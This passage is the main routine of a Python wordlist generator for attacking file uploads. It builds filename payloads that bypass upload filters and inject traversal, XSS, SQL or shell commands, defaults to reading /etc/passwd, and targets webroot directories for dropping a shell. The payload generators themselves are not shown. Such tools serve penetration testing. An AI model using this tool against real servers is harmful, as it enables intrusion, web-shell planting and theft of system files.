        print(f"  {W}{BLD}TECHNIQUES  {DG}({len(TECHNIQUES)} filter-bypass){RS}")
        print(divider)
        for i, (k, (desc, _)) in enumerate(TECHNIQUES.items(), 1):
            print(f"  {DG}  {i:2d}.{RS}  {C}{k:28s}{RS}  {desc}")
        print()
        print(f"  {W}{BLD}ATTACKS  {DG}({len(ATTACKS)} injection-via-filename){RS}")
        print(divider)
        for i, (k, (desc, _)) in enumerate(ATTACKS.items(), 1):
            print(f"  {DG}  {i:2d}.{RS}  {C}{k:28s}{RS}  {desc}")
        print()
        print(f"  {W}{BLD}Languages:{RS}  {', '.join(ALL_LANGS)}, all")
        print()
        return

    # Load paths registry: external --paths-json overrides; embedded is fallback
    # (so the tool is fully self-contained even with no paths.json on disk).
    paths_json_path = Path(opts.paths_json) if opts.paths_json else None
    registry = load_paths_json(paths_json_path)
    # registry is guaranteed non-None (embedded copy is the fallback)

    # Collect selectors (positional + --technique + --attack), auto-route
    selected_techs, selected_attacks = set(), set()
    all_sel = list(opts.selectors)
    for x in (opts.technique or []):
        all_sel.extend(s.strip() for s in x.split(","))
    for x in (opts.attack or []):
        all_sel.extend(s.strip() for s in x.split(","))
    all_sel = [s for s in all_sel if s]

    if not all_sel:
        parser.error("Specify at least one selector (or 'all'). Try --list to see options.")

    for sel in all_sel:
        sel = sel.lower()
        if sel == "all":
            selected_techs.update(TECHNIQUES)
            selected_attacks.update(ATTACKS)
        elif sel in TECHNIQUES:
            selected_techs.add(sel)
        elif sel in ATTACKS:
            selected_attacks.add(sel)
        else:
            parser.error(f"unknown selector '{sel}'. Run --list for valid names.")

    # Languages, stems
    langs = ALL_LANGS if opts.extension == "all" else [opts.extension]
    stems = ([s.strip() for s in opts.stems.split(",") if s.strip()]
             if opts.stems else [opts.stem])

    # C3: refuse a directory --file-read (literal or @key resolving to dir).
    # Multi-leaf @key results are already dir-filtered by the resolver.
    _validate_file_read_or_die(opts.file_read, parser.error)

    # Resolve --file-read (READ-mode targets — files only)
    file_read_targets = ["/etc/passwd"]
    if opts.file_read:
        resolved = resolve_paths_key(registry, opts.file_read)
        if resolved is None:
            parser.error(f"could not resolve --file-read '{opts.file_read}'")
        file_read_targets = resolved

    # Resolve --webroot (WRITE-mode drop targets — dirs by design, so
    # allow_dirs=True; the validator above does NOT apply here).
    webroot_targets = None
    if opts.webroot:
        if not opts.webroot.startswith("@") and not _is_dir_path(opts.webroot):
            parser.error(
                f"--webroot {opts.webroot!r} is not a directory path "
                f"(no trailing '/' or '\\\\'). Drop targets must be dirs, "
                f"e.g. /var/www/html/ or @webroots.php.linux.")
        webroot_targets = resolve_paths_key(registry, opts.webroot, allow_dirs=True)
        if webroot_targets is None:
            parser.error(f"could not resolve --webroot '{opts.webroot}'")

    if opts.seed is not None:
        random.seed(opts.seed)

    # Generate
    out_root = Path(opts.output)
    out_root.mkdir(parents=True, exist_ok=True)

    banner()
    print(f"  {W}{BLD}output{RS} → {C}{out_root}{RS}")
    print(f"  langs       : {', '.join(langs)}")
    print(f"  stems       : {', '.join(stems)}")
    print(f"  techniques  : {', '.join(sorted(selected_techs)) or '(none)'}")
    print(f"  attacks     : {', '.join(sorted(selected_attacks)) or '(none)'}")
    if opts.file_read:
        print(f"  file-read   : {opts.file_read} → {len(file_read_targets)} target(s)")
    if opts.webroot:
        print(f"  webroot     : {opts.webroot} → {len(webroot_targets)} dir(s)")
    print()

    total_w, total_s, total_files = 0, 0, 0

    for lang in langs:
        lang_dir = out_root / lang
        tech_dir = lang_dir / "technique"
        atk_dir = lang_dir / "attack"
        if selected_techs:
            tech_dir.mkdir(parents=True, exist_ok=True)
        if selected_attacks:
            atk_dir.mkdir(parents=True, exist_ok=True)
        else:
            lang_dir.mkdir(parents=True, exist_ok=True)

        mega = [] if opts.mega else None
        lang_w, lang_s, lang_f = 0, 0, 0

        # Techniques
        for name in sorted(selected_techs):
            _desc, fn = TECHNIQUES[name]
            result = fn(stems, lang, opts.allowed)
            for kind, lines in result.items():
                if not lines:
                    continue
                if opts.seed is not None:
                    random.shuffle(lines)
                suffix = f"_{kind}" if len(result) > 1 else ""
                fp = tech_dir / f"{name}{suffix}.txt"
                w, s = write_wordlist(lines, fp, opts.max_per_technique)
                lang_w += w; lang_s += s; lang_f += 1
                if mega is not None:
                    mega.extend(lines)

        # Attacks
        for name in sorted(selected_attacks):
            _desc, fn = ATTACKS[name]
            kwargs = {}
            if name == "path_traversal_filename":
                kwargs = {"depth": opts.depth, "file_read": file_read_targets,
                          "webroot_paths": webroot_targets}
            result = fn(stems, lang, opts.allowed, **kwargs)
            for kind, lines in result.items():
                if not lines:
                    continue
                if opts.seed is not None:
                    random.shuffle(lines)
                suffix = f"_{kind}" if len(result) > 1 else ""
                fp = atk_dir / f"{name}{suffix}.txt"
                w, s = write_wordlist(lines, fp, opts.max_per_technique)
                lang_w += w; lang_s += s; lang_f += 1
                if mega is not None:
                    mega.extend(lines)

        # Mega rollup
        if mega is not None and mega:
            fp = lang_dir / "all.txt"
            w, s = write_wordlist(dedupe(mega), fp, opts.max_per_technique)
            lang_w += w; lang_s += s; lang_f += 1

        # Per-lang README
        readme = lang_dir / "_README.txt"
        with readme.open("w", encoding="utf-8") as f:
            f.write(
                f"# Upname output — language: {lang}\n\n"
                f"## Files\n"
                f"  technique/  — filter-bypass mutations. Feed as the multipart\n"
                f"                'filename=' field; body must be a {lang.upper()} shell\n"
                f"                for these to fire on a successful bypass.\n"
                f"  attack/     — injection-via-filename payloads (traversal, XSS, SQLi,\n"
                f"                cmd inj). Body can be any innocuous image; the trigger\n"
                f"                is the filename's reflection/use server-side.\n"
                f"  all.txt     — (if --mega) deduped union of every file above.\n\n"
                f"## *_raw.txt vs *_urlenc.txt\n"
                f"  *_raw.txt    literal bytes — what Burp Repeater / multipart filename\n"
                f"               field expect; some lines contain NUL bytes or Unicode\n"
                f"               control chars that may display oddly in text editors.\n"
                f"  *_urlenc.txt URL-encoded form — printable, safe for tools that\n"
                f"               require ASCII; some delivery layers auto-decode and\n"
                f"               others send literally (verify behavior in your consumer).\n\n"
                f"## Notes\n"
                f"  - Lines containing raw LF/CR are skipped (would break wordlist\n"
                f"    format). Their semantic equivalent lives in the _urlenc.txt\n"
                f"    sibling via %0a / %0d%0a.\n"
                f"  - Filenames with raw NUL bytes ARE valid lines; consumers like Burp\n"
                f"    and ffuf handle them correctly even though `cat`/`less` may not.\n"
            )
        lang_f += 1
        total_w += lang_w; total_s += lang_s; total_files += lang_f

    print(f"  {green('done')}.  {bold(str(total_w))} lines across "
          f"{bold(str(total_files))} files"
          f"{f' ({yellow(str(total_s))} newline-unsafe skipped)' if total_s else ''}")


if __name__ == "__main__":
    main()
